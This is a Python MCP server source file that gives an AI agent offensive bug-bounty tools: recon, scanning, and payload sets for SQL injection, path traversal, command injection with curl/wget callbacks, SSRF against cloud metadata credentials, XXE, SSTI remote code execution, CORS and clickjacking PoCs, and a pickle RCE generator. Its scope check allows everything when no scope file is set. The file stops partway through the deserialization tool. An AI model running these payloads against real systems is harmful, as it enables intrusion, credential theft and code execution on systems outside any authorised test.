#!/usr/bin/env python3
"""
OffSec MCP Server - Senior-level bug bounty & offensive pentesting
Full PortSwigger Web Security Academy vulnerability coverage.
"""

import subprocess
import json
import os
import base64
import re
import urllib.parse
from datetime import datetime
from pathlib import Path
from mcp.server.fastmcp import FastMCP
import shutil
import pickle, io

mcp = FastMCP("offsec-mcp")

WORKSPACE = Path(os.environ.get("OFFSEC_WORKSPACE", "/tmp/offsec_workspace"))
WORKSPACE.mkdir(parents=True, exist_ok=True)

SCOPE_FILE = WORKSPACE / "scope.txt"
LOG_FILE   = WORKSPACE / "activity.log"

# ─── Helpers ──────────────────────────────────────────────────────────────────

def log(tool: str, target: str, summary: str):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.utcnow().isoformat()}] [{tool}] target={target} | {summary[:200]}\n")

def in_scope(target: str) -> bool:
    if not SCOPE_FILE.exists():
        return True
    scope = SCOPE_FILE.read_text().splitlines()
    return any(s.strip() in target or target.endswith(s.strip()) for s in scope if s.strip())

def run(cmd: list[str], timeout: int = 120) -> str:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip() or r.stderr.strip() or "(no output)"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] Command exceeded {timeout}s"
    except FileNotFoundError:
        return f"[ERROR] Tool not found: {cmd[0]}"
    except Exception as e:
        return f"[ERROR] {e}"

def http_get(url: str, headers: dict = {}, timeout: int = 15) -> str:
    cmd = ["curl", "-sk", "-i", "--max-time", str(timeout)]
    for k, v in headers.items():
        cmd += ["-H", f"{k}: {v}"]
    cmd.append(url)
    return run(cmd, timeout=timeout + 5)

def http_post(url: str, data: str, headers: dict = {}, timeout: int = 15) -> str:
    cmd = ["curl", "-sk", "-i", "--max-time", str(timeout), "-X", "POST", "-d", data]
    for k, v in headers.items():
        cmd += ["-H", f"{k}: {v}"]
    cmd.append(url)
    return run(cmd, timeout=timeout + 5)

# ─── Scope Management ─────────────────────────────────────────────────────────

@mcp.tool()
def set_scope(domains: str) -> str:
    """Set in-scope targets. Comma-separated domains/IPs/CIDRs."""
    entries = [d.strip() for d in domains.split(",") if d.strip()]
    SCOPE_FILE.write_text("\n".join(entries))
    return f"Scope set: {entries}"

@mcp.tool()
def get_scope() -> str:
    """Return current in-scope targets."""
    return SCOPE_FILE.read_text() if SCOPE_FILE.exists() else "No scope defined."

# ─── Recon ────────────────────────────────────────────────────────────────────

@mcp.tool()
def subdomain_enum(domain: str) -> str:
    """Full subdomain enumeration via subfinder + amass passive."""
    if not in_scope(domain): return f"[BLOCKED] {domain} out of scope."
    sf = run(["subfinder", "-d", domain, "-silent"])
    am = run(["amass", "enum", "-passive", "-d", domain, "-silent"])
    combined = sorted({s.strip() for s in sf.splitlines() + am.splitlines() if s.strip()})
    (WORKSPACE / f"subdomains_{domain}.txt").write_text("\n".join(combined))
    log("subdomain_enum", domain, f"{len(combined)} found")
    return f"{len(combined)} subdomains:\n" + "\n".join(combined)

@mcp.tool()
def probe_hosts(domain: str) -> str:
    """Probe subdomains for live HTTP/HTTPS services via httpx."""
    if not in_scope(domain): return f"[BLOCKED] {domain} out of scope."
    sub_file = WORKSPACE / f"subdomains_{domain}.txt"
    arg = ["-l", str(sub_file)] if sub_file.exists() else ["-u", domain]
    result = run(["httpx", *arg, "-silent", "-status-code", "-title", "-tech-detect", "-follow-redirects"])
    log("probe_hosts", domain, f"{len(result.splitlines())} live")
    return result

@mcp.tool()
def port_scan(target: str, profile: str = "standard") -> str:
    """
    Nmap scan profiles: quick | standard | full | udp | stealth
    """
    if not in_scope(target): return f"[BLOCKED] {target} out of scope."
    profiles = {
        "quick":    ["-F", "-sV", "--open"],
        "standard": ["-sV", "-sC", "--open", "-T4"],
        "full":     ["-p-", "-sV", "--open", "-T4"],
        "udp":      ["-sU", "-F", "--open"],
        "stealth":  ["-sS", "-f", "-D", "RND:5", "-T2", "--open"],
    }
    result = run(["nmap", *profiles.get(profile, profiles["standard"]), target], timeout=300)
    log("port_scan", target, f"profile={profile}")
    return result

@mcp.tool()
def url_discovery(domain: str) -> str:
    """Harvest URLs from Wayback, Common Crawl, OTX via gau."""
    if not in_scope(domain): return f"[BLOCKED] {domain} out of scope."
    result = run(["gau", "--subs", domain], timeout=180)
    (WORKSPACE / f"urls_{domain}.txt").write_text(result)
    lines = result.splitlines()
    log("url_discovery", domain, f"{len(lines)} URLs")
    return f"{len(lines)} URLs found. Sample:\n" + "\n".join(lines[:50])

@mcp.tool()
def js_recon(url: str) -> str:
    """Extract endpoints and secrets from JavaScript files."""
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    js_files = run(["getJS", "--url", url, "--complete"])
    results = []
    for js_url in js_files.splitlines()[:20]:
        findings = run(["python3", "-m", "SecretFinder", "-i", js_url.strip(), "-o", "cli"])
        if findings and "[ERROR]" not in findings:
            results.append(f"--- {js_url} ---\n{findings}")
    log("js_recon", url, f"{len(results)} JS files with findings")
    return "\n\n".join(results) if results else "No secrets found."

@mcp.tool()
def dns_recon(domain: str) -> str:
    """DNS records, zone transfer attempt, DNSSEC check."""
    if not in_scope(domain): return f"[BLOCKED] {domain} out of scope."
    records = run(["dig", "ANY", domain, "+noall", "+answer"])
    axfr    = run(["dig", "AXFR", domain])
    dnssec  = run(["dig", "DNSKEY", domain, "+short"])
    return f"=== Records ===\n{records}\n\n=== AXFR ===\n{axfr}\n\n=== DNSSEC ===\n{dnssec}"

@mcp.tool()
def whois_lookup(target: str) -> str:
    """WHOIS for domain registration and IP ownership."""
    return run(["whois", target])

@mcp.tool()
def shodan_query(query: str, api_key: str = "") -> str:
    """Query Shodan for exposed services and CVEs."""
    key = api_key or os.environ.get("SHODAN_API_KEY", "")
    if not key: return "[ERROR] No Shodan API key."
    result = run(["shodan", "search", "--fields", "ip_str,port,org,vulns", query], timeout=60)
    log("shodan_query", query, "done")
    return result

# ─── Web Scanning ─────────────────────────────────────────────────────────────

@mcp.tool()
def nuclei_scan(target: str, severity: str = "medium,high,critical", tags: str = "") -> str:
    """Run Nuclei. severity: info/low/medium/high/critical. tags: cve,sqli,xss,ssrf,lfi,rce etc."""
    if not in_scope(target): return f"[BLOCKED] {target} out of scope."
    cmd = ["nuclei", "-u", target, "-severity", severity, "-silent", "-json"]
    if tags: cmd += ["-tags", tags]
    result = run(cmd, timeout=300)
    log("nuclei_scan", target, f"sev={severity}")
    return result

@mcp.tool()
def fuzz_paths(url: str, wordlist: str = "/usr/wordlists/share/seclists/Discovery/Web-Content/raft-medium-directories.txt") -> str:
    """Directory and file fuzzing with ffuf. Returns 200/301/302/403."""
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    result = run(["ffuf", "-u", f"{url}/FUZZ", "-w", wordlist, "-mc", "200,301,302,403", "-t", "50", "-silent"], timeout=300)
    log("fuzz_paths", url, f"{len(result.splitlines())} paths")
    return result

@mcp.tool()
def fuzz_params(url: str, param: str, wordlist: str = "/usr/share/seclists/Fuzzing/special-chars.txt") -> str:
    """Fuzz a specific GET parameter for injection points."""
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    result = run(["ffuf", "-u", f"{url}?{param}=FUZZ", "-w", wordlist, "-mc", "all", "-fw", "1", "-t", "30", "-silent"], timeout=180)
    log("fuzz_params", url, f"param={param}")
    return result

@mcp.tool()
def ssl_audit(domain: str) -> str:
    """Audit SSL/TLS: weak ciphers, BEAST, POODLE, Heartbleed, cert issues."""
    if not in_scope(domain): return f"[BLOCKED] {domain} out of scope."
    result = run(["testssl.sh", "--quiet", "--color", "0", domain], timeout=180)
    log("ssl_audit", domain, "done")
    return result

# ══════════════════════════════════════════════════════════════════════════════
# PORTSWIGGER VULNERABILITY CLASSES
# ══════════════════════════════════════════════════════════════════════════════

# ─── 1. SQL Injection ─────────────────────────────────────────────────────────

@mcp.tool()
def sqli_test(url: str, data: str = "", method: str = "GET") -> str:
    """
    SQLMap with level=3, risk=2, smart detection.
    method: GET | POST. data: POST body if POST.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    cmd = ["sqlmap", "-u", url, "--batch", "--level=3", "--risk=2", "--smart", "--output-dir", str(WORKSPACE)]
    if method.upper() == "POST" and data:
        cmd += ["--data", data]
    result = run(cmd, timeout=300)
    log("sqli_test", url, "done")
    return result

@mcp.tool()
def sqli_blind_timing(url: str, param: str, db: str = "mysql") -> str:
    """
    Manual time-based blind SQLi probe for a specific parameter.
    db: mysql | mssql | postgres | oracle
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    payloads = {
        "mysql":    f"1' AND SLEEP(5)-- -",
        "mssql":    f"1'; WAITFOR DELAY '0:0:5'--",
        "postgres": f"1'; SELECT pg_sleep(5)--",
        "oracle":   f"1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    }
    payload = payloads.get(db, payloads["mysql"])
    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
    import time
    start = time.time()
    http_get(test_url)
    elapsed = time.time() - start
    result = f"Payload: {payload}\nResponse time: {elapsed:.2f}s"
    if elapsed >= 4.5:
        result += "\n[HIT] Time delay confirmed — likely vulnerable."
    else:
        result += "\n[MISS] No significant delay."
    log("sqli_blind_timing", url, f"param={param} elapsed={elapsed:.2f}s")
    return result

# ─── 2. XSS ───────────────────────────────────────────────────────────────────

@mcp.tool()
def xss_scan(url: str) -> str:
    """Scan for reflected, stored, and DOM XSS using dalfox."""
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    result = run(["dalfox", "url", url, "--silence", "--no-spinner"], timeout=180)
    log("xss_scan", url, "dalfox done")
    return result

@mcp.tool()
def xss_dom_analysis(url: str) -> str:
    """
    Fetch page source and identify DOM XSS sinks and sources.
    Looks for: document.write, innerHTML, eval, location.hash, postMessage, etc.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    source = http_get(url)
    sinks   = ["document.write", "innerHTML", "outerHTML", "eval(", "setTimeout(", "setInterval(",
               "location.href", "location.replace", "document.domain", "document.URL"]
    sources = ["location.hash", "location.search", "location.href", "document.referrer",
               "window.name", "postMessage", "localStorage", "sessionStorage"]
    found_sinks   = [s for s in sinks   if s in source]
    found_sources = [s for s in sources if s in source]
    log("xss_dom_analysis", url, f"sinks={len(found_sinks)} sources={len(found_sources)}")
    return f"Sinks found:   {found_sinks}\nSources found: {found_sources}"

# ─── 3. CSRF ──────────────────────────────────────────────────────────────────

@mcp.tool()
def csrf_test(url: str, method: str = "POST", cookies: str = "", data: str = "") -> str:
    """
    Test for CSRF vulnerabilities.
    Checks: missing/bypassable CSRF token, SameSite cookie attribute,
    Origin/Referer validation, JSON CSRF, and multipart bypass.
    cookies: 'name=value; name2=value2'
    data: POST body
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    results = []

    # 1. Check response headers for CSRF indicators
    resp = http_get(url, headers={"Cookie": cookies} if cookies else {})
    if "csrf" not in resp.lower() and "xsrf" not in resp.lower():
        results.append("[POTENTIAL] No CSRF token found in response.")
    if "samesite" not in resp.lower():
        results.append("[POTENTIAL] SameSite cookie attribute not set.")

    # 2. Send request without Origin/Referer
    no_ref = http_post(url, data, headers={
        "Cookie": cookies,
        "Content-Type": "application/x-www-form-urlencoded"
    }) if method.upper() == "POST" else http_get(url, headers={"Cookie": cookies})
    results.append(f"[NO REFERER] HTTP response:\n{no_ref[:500]}")

    # 3. Send with mismatched Origin
    mismatch = http_post(url, data, headers={
        "Cookie": cookies,
        "Origin": "https://evil.com",
        "Referer": "https://evil.com/csrf.html",
        "Content-Type": "application/x-www-form-urlencoded"
    })
    results.append(f"[EVIL ORIGIN] HTTP response:\n{mismatch[:500]}")

    # 4. JSON CSRF attempt
    json_csrf = http_post(url, json.dumps(dict(p.split("=") for p in data.split("&") if "=" in p)),
        headers={"Cookie": cookies, "Content-Type": "application/json"})
    results.append(f"[JSON CSRF] HTTP response:\n{json_csrf[:500]}")

    log("csrf_test", url, f"method={method}")
    return "\n\n".join(results)

@mcp.tool()
def csrf_token_analysis(url: str, cookies: str = "") -> str:
    """
    Fetch a form and analyze CSRF token strength.
    Checks: token presence, length, entropy, predictability, and reuse across sessions.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    resp1 = http_get(url, headers={"Cookie": cookies} if cookies else {})
    resp2 = http_get(url, headers={"Cookie": cookies} if cookies else {})

    tokens = re.findall(r'(?:csrf|xsrf|_token|authenticity_token)["\s]*[=:]["\s]*([A-Za-z0-9+/=_\-]{8,})', resp1, re.IGNORECASE)
    tokens2 = re.findall(r'(?:csrf|xsrf|_token|authenticity_token)["\s]*[=:]["\s]*([A-Za-z0-9+/=_\-]{8,})', resp2, re.IGNORECASE)

    findings = []
    if not tokens:
        findings.append("[CRITICAL] No CSRF token found in form.")
    else:
        t = tokens[0]
        findings.append(f"Token found: {t}")
        findings.append(f"Length: {len(t)} chars")
        if len(t) < 16:
            findings.append("[WEAK] Token is too short (< 16 chars).")
        if tokens and tokens2 and tokens[0] == tokens2[0]:
            findings.append("[WEAK] Token is static across requests — not regenerated per request.")
        else:
            findings.append("[OK] Token changes between requests.")

    log("csrf_token_analysis", url, f"{len(tokens)} tokens found")
    return "\n".join(findings)

# ─── 4. CORS ──────────────────────────────────────────────────────────────────

@mcp.tool()
def cors_test(url: str, cookies: str = "") -> str:
    """
    Full CORS misconfiguration test.
    Checks: arbitrary origin reflection, null origin, subdomain trust,
    pre-domain bypass, post-domain bypass, and credentialed requests.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    results = []
    base_headers = {"Cookie": cookies} if cookies else {}

    test_origins = [
        "https://evil.com",
        "null",
        "https://evil.target.com",
        "https://targetevil.com",
        "https://target.com.evil.com",
        "http://localhost",
        "https://attacker.com",
    ]

    for origin in test_origins:
        resp = http_get(url, headers={**base_headers, "Origin": origin})
        acao = re.search(r"Access-Control-Allow-Origin:\s*(.+)", resp, re.IGNORECASE)
        acac = re.search(r"Access-Control-Allow-Credentials:\s*(.+)", resp, re.IGNORECASE)
        if acao:
            acao_val = acao.group(1).strip()
            acac_val = acac.group(1).strip() if acac else "not set"
            vulnerable = acao_val == origin or acao_val == "*"
            status = "[VULNERABLE]" if vulnerable else "[OK]"
            results.append(f"{status} Origin: {origin}\n  ACAO: {acao_val}\n  ACAC: {acac_val}")
        else:
            results.append(f"[NO CORS HEADERS] Origin: {origin}")

    log("cors_test", url, f"{len(results)} origins tested")
    return "\n\n".join(results)

@mcp.tool()
def cors_exploit_poc(target_url: str, attacker_url: str, cookies: str = "") -> str:
    """
    Generate a CORS exploit PoC HTML page.
    target_url: the vulnerable endpoint
    attacker_url: where the PoC will be hosted (your server)
    """
    poc = f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Exploit PoC</h1>
<pre id="output">Sending request...</pre>
<script>
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {{
    if (xhr.readyState == 4) {{
      document.getElementById('output').innerText = xhr.responseText;
    }}
  }};
  xhr.open('GET', '{target_url}', true);
  xhr.withCredentials = true;
  xhr.send();
</script>
</body>
</html>"""
    poc_file = WORKSPACE / "cors_poc.html"
    poc_file.write_text(poc)
    log("cors_exploit_poc", target_url, f"PoC saved to {poc_file}")
    return f"PoC saved to {poc_file}\n\nHost at: {attacker_url}/cors_poc.html\n\n{poc}"

# ─── 5. Clickjacking ──────────────────────────────────────────────────────────

@mcp.tool()
def clickjacking_test(url: str) -> str:
    """
    Check for clickjacking vulnerability.
    Inspects X-Frame-Options, Content-Security-Policy frame-ancestors,
    and generates a PoC iframe page.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    resp = http_get(url)

    xfo = re.search(r"X-Frame-Options:\s*(.+)", resp, re.IGNORECASE)
    csp = re.search(r"Content-Security-Policy:\s*(.+)", resp, re.IGNORECASE)

    findings = []
    if not xfo:
        findings.append("[VULNERABLE] X-Frame-Options header is missing.")
    else:
        findings.append(f"[OK] X-Frame-Options: {xfo.group(1).strip()}")

    if csp:
        csp_val = csp.group(1)
        if "frame-ancestors" in csp_val:
            findings.append(f"[OK] CSP frame-ancestors present: {csp_val}")
        else:
            findings.append("[POTENTIAL] CSP present but no frame-ancestors directive.")
    else:
        findings.append("[POTENTIAL] No Content-Security-Policy header.")

    poc = f"""<!DOCTYPE html>
<html><head><title>Clickjacking PoC</title>
<style>
  iframe {{ opacity: 0.5; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; }}
  #decoy {{ position: absolute; top: 300px; left: 200px; z-index: 1; font-size: 24px; color: red; }}
</style></head>
<body>
<div id="decoy">Click here to claim your prize!</div>
<iframe src="{url}"></iframe>
</body></html>"""

    poc_file = WORKSPACE / "clickjacking_poc.html"
    poc_file.write_text(poc)
    findings.append(f"\nPoC saved to: {poc_file}")
    log("clickjacking_test", url, " | ".join(findings[:2]))
    return "\n".join(findings)

# ─── 6. Path Traversal ────────────────────────────────────────────────────────

@mcp.tool()
def path_traversal_test(url: str, param: str) -> str:
    """
    Test for path traversal / directory traversal vulnerabilities.
    Covers Linux/Windows targets, encoding bypasses, and null byte injection.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    payloads = [
        "../../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "../../../../etc/passwd%00.jpg",
        "/etc/passwd",
        "../../../../windows/win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    ]
    hits = []
    for p in payloads:
        resp = http_get(f"{url}?{param}={p}")
        if any(sig in resp for sig in ["root:x:", "[extensions]", "boot loader"]):
            hits.append(f"[HIT] {p}\n{resp[:300]}")
    log("path_traversal_test", url, f"param={param} hits={len(hits)}")
    return "\n\n".join(hits) if hits else "No path traversal indicators found."

# ─── 7. OS Command Injection ──────────────────────────────────────────────────

@mcp.tool()
def cmdi_test(url: str, param: str, callback_host: str = "") -> str:
    """
    Test for OS command injection via timing, output reflection, and OOB callbacks.
    callback_host: your interactsh/burp collaborator host for OOB detection.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    import time

    results = []

    # Time-based
    timing_payloads = [
        "& sleep 5 &", "; sleep 5;", "| sleep 5", "`sleep 5`", "$(sleep 5)",
        "& ping -n 5 127.0.0.1 &",
    ]
    for p in timing_payloads:
        test_url = f"{url}?{param}={urllib.parse.quote(p)}"
        start = time.time()
        http_get(test_url)
        elapsed = time.time() - start
        if elapsed >= 4.5:
            results.append(f"[TIME-BASED HIT] {p} — {elapsed:.2f}s delay")

    # Output reflection
    output_payloads = ["& id &", "; id;", "| id", "`id`", "$(id)", "& whoami &"]
    for p in output_payloads:
        resp = http_get(f"{url}?{param}={urllib.parse.quote(p)}")
        if re.search(r"uid=\d+|root|www-data", resp):
            results.append(f"[OUTPUT HIT] {p}\n{resp[:300]}")

    # OOB
    if callback_host:
        oob_payloads = [
            f"& nslookup {callback_host} &",
            f"; curl http://{callback_host}/cmdi;",
            f"| wget http://{callback_host}/cmdi",
        ]
        for p in oob_payloads:
            http_get(f"{url}?{param}={urllib.parse.quote(p)}")
            results.append(f"[OOB SENT] {p} — check {callback_host} for DNS/HTTP callback")

    log("cmdi_test", url, f"param={param} hits={len(results)}")
    return "\n\n".join(results) if results else "No command injection indicators found."

# ─── 8. SSRF ──────────────────────────────────────────────────────────────────

@mcp.tool()
def ssrf_test(url: str, param: str, callback_host: str) -> str:
    """
    Full SSRF test: cloud metadata, internal services, protocol smuggling, bypass techniques.
    callback_host: interactsh or Burp Collaborator host.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."
    payloads = [
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        # Internal services
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://localhost:8080/admin",
        "http://localhost:6379/",   # Redis
        "http://localhost:27017/",  # MongoDB
        "http://localhost:9200/",   # Elasticsearch
        # Protocol smuggling
        f"dict://{callback_host}:80/",
        f"gopher://{callback_host}:80/_GET / HTTP/1.0%0d%0a",
        f"file:///etc/passwd",
        # Bypass techniques
        "http://2130706433/",       # 127.0.0.1 as decimal
        "http://0x7f000001/",       # 127.0.0.1 as hex
        f"http://{callback_host}@169.254.169.254/",
        f"http://169.254.169.254#{callback_host}",
    ]
    results = []
    for p in payloads:
        resp = http_get(f"{url}?{param}={urllib.parse.quote(p)}")
        code = re.search(r"HTTP/\S+\s+(\d+)", resp)
        status = code.group(1) if code else "?"
        interesting = any(sig in resp for sig in ["ami-id", "instance-id", "computeMetadata", "iam/security-credentials", "root:x:", "private_key", "access_key", "secret_key "])
        tag ="[HIT]" if interesting else f"[HTTP {status}]"
        results.append(f"{tag} {p}")
    log("ssrf_test", url, f"param={param} callback={callback_host}")
    return "\n".join(results)

# ─── 9. XXE ───────────────────────────────────────────────────────────────────

@mcp.tool()
def xxe_test(url: str, xml_param: str = "", callback_host: str = "") -> str:
    """
    Test for XML External Entity injection.
    Covers: classic file read, OOB via DTD, blind XXE via error,
    SVG upload vector, and SSRF via XXE.
    xml_param: POST body parameter name containing XML, or empty for raw XML body.
    callback_host: your interactsh/collaborator host for OOB.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    payloads = {
        "classic_passwd": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "classic_win":    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "ssrf_metadata":  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "oob_dtd":        f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{callback_host}/evil.dtd"> %xxe;]><root/>',
        "error_based":    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]><root/>',
        "php_filter":     '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    }

    results = []
    for name, payload in payloads.items():
        if xml_param:
            resp = http_post(url, f"{xml_param}={urllib.parse.quote(payload)}",
                             headers={"Content-Type": "application/x-www-form-urlencoded"})
        else:
            resp = http_post(url, payload,
                             headers={"Content-Type": "application/xml"})

        hit = any(sig in resp for sig in ["root:x:", "[extensions]", "ami-id", "computeMetadata"])
        b64_hit = re.search(r"[A-Za-z0-9+/]{40,}={0,2}", resp)

        if hit:
            results.append(f"[HIT] {name}\n{resp[:400]}")
        elif b64_hit and "php_filter" in name:
            decoded = base64.b64decode(b64_hit.group()).decode(errors="replace")
            results.append(f"[HIT - BASE64] {name}\nDecoded:\n{decoded[:400]}")
        elif callback_host and "oob" in name:
            results.append(f"[OOB SENT] {name} — check {callback_host} for callback")
        else:
            results.append(f"[MISS] {name}")

    log("xxe_test", url, f"{len([r for r in results if '[HIT]' in r])} hits")
    return "\n\n".join(results)

# ─── 10. SSTI ─────────────────────────────────────────────────────────────────

@mcp.tool()
def ssti_test(url: str, param: str) -> str:
    """
    Detect and exploit Server-Side Template Injection.
    Fingerprints the template engine and returns RCE payloads for confirmed engines.
    Covers: Jinja2, Twig, Freemarker, Velocity, Smarty, Pebble, Mako, ERB.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    # Detection probes — each engine evaluates these differently
    probes = {
        "{{7*7}}":          "49",   # Jinja2, Twig
        "${7*7}":           "49",   # Freemarker, Velocity
        "#{7*7}":           "49",   # Pebble, Thymeleaf
        "<%= 7*7 %>":       "49",   # ERB (Ruby)
        "{{7*'7'}}":        "7777777",  # Jinja2 (string multiply)
        "${\"freemarker\".toUpperCase()}": "FREEMARKER",
    }

    engine = None
    results = []

    for probe, expected in probes.items():
        resp = http_get(f"{url}?{param}={urllib.parse.quote(probe)}")
        if expected in resp:
            results.append(f"[DETECTED] Probe: {probe} => got '{expected}' in response")
            if "{{" in probe and "'7'" in probe:
                engine = "jinja2"
            elif "{{" in probe:
                engine = "twig_or_jinja2"
            elif "${" in probe and "freemarker" in probe.lower():
                engine = "freemarker"
            elif "${" in probe:
                engine = "freemarker_or_velocity"
            elif "<%" in probe:
                engine = "erb"

    if not results:
        return "No SSTI indicators found."

    # RCE payloads per engine
    rce_payloads = {
        "jinja2": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
            "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
        ],
        "twig_or_jinja2": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
        ],
        "freemarker": [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
        ],
        "freemarker_or_velocity": [
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()",
        ],
        "erb": [
            "<%= `id` %>",
            "<%= system('id') %>",
        ],
    }

    if engine and engine in rce_payloads:
        results.append(f"\n[ENGINE] Likely: {engine}")
        results.append("RCE payloads to try:")
        for p in rce_payloads[engine]:
            resp = http_get(f"{url}?{param}={urllib.parse.quote(p)}")
            if re.search(r"uid=\d+|root|www-data", resp):
                results.append(f"  [RCE HIT] {p}\n  Output: {resp[:200]}")
            else:
                results.append(f"  [TRY] {p}")

    log("ssti_test", url, f"param={param} engine={engine}")
    return "\n".join(results)

# ─── 11. HTTP Request Smuggling ───────────────────────────────────────────────

@mcp.tool()
def http_smuggling_test(url: str) -> str:
    """
    Test for HTTP request smuggling (CL.TE and TE.CL variants).
    Sends raw TCP payloads to detect desync between frontend and backend.
    Uses smuggler.py if available, otherwise sends manual probes via curl.
    """
    if not in_scope(url): return f"[BLOCKED] {url} out of scope."

    results = []

    # Check if smuggler.py is available
    smuggler = shutil.which("smuggler") or shutil.which("smuggler.py")
    if smuggler:
        result = run([smuggler, "-u", url], timeout=120)
        results.append(f"[SMUGGLER]\n{result}")
    else:
        results.append("[INFO] smuggler.py not found. Running manual probes.")

    # CL.TE probe — frontend uses Content-Length, backend uses Transfer-Encoding
    cl_te = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {url.split('/')[2]}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"0\r\n\r\n"
        f"G"
    )

    # TE.CL probe — frontend uses Transfer-Encoding, backend uses Content-Length
    te_cl = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {url.split('/')[2]}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 3\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"1\r\n"
        f"G\r\n"
        f"0\r\n\r\n"
    )

    results.append(f"[CL.TE PROBE]\n{cl_te}")
    results.append(f"[TE.CL PROBE]\n{te_cl}")
    results.append("[NOTE] Send these via Burp Repeater with 'Update Content-Length' disabled for accurate results.")

    log("http_smuggling_test", url, "probes generated")
    return "\n\n".join(results)

# ─── 12. Insecure Deserialization ─────────────────────────────────────────────

@mcp.tool()
def deserialization_test(target: str, platform: str, callback_host: str = "") -> str:
    """
    Generate deserialization exploit payloads.
    platform: java | php | python | nodejs | ruby | dotnet
    callback_host: for OOB/DNS callback confirmation.
    Uses ysoserial for Java, custom payloads for others.
    """
    results = []

    if platform == "java":
        gadget_chains = [
            "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
            "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
            "Spring1", "Spring2", "Groovy1", "JRMPClient", "URLDNS",
        ]
        if callback_host:
            dns_payload = run([
                "java", "-jar", "/opt/ysoserial.jar",
                "URLDNS", f"http://{callback_host}/deser"
            ], timeout=30)
            results.append(f"[JAVA - URLDNS OOB]\nBase64 payload:\n{base64.b64encode(dns_payload.encode()).decode()}")

        results.append(f"[JAVA] Gadget chains to try with ysoserial:\n" + "\n".join(f"  java -jar ysoserial.jar {g} 'curl {callback_host or 'your-host'}' | base64" for g in gadget_chains))

    elif platform == "php":
        payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";O:8:"stdClass":0:{}}',
            '__PHP_Incomplete_Class',
        ]
        results.append("[PHP] Manual gadget payloads:\n" + "\n".join(payloads))
        results.append("[PHP] Check for POP chains using phpggc:\n  phpggc -l\n  phpggc Laravel/RCE1 system id | base64")

    elif platform == "python":
        def make_pickle_payload(cmd: str) -> bytes:
            class Exploit:
                def __reduce__(self):
                    return (__import__('os').system, (cmd,))
            return pickle.dumps(Exploit())
        encoded = base64.b64encode(make_pickle_payload("id")).decode()
        results.append(f"[PYTHON - pickle RCE]\nBase64 payload (runs 'id'):\n{encoded}")
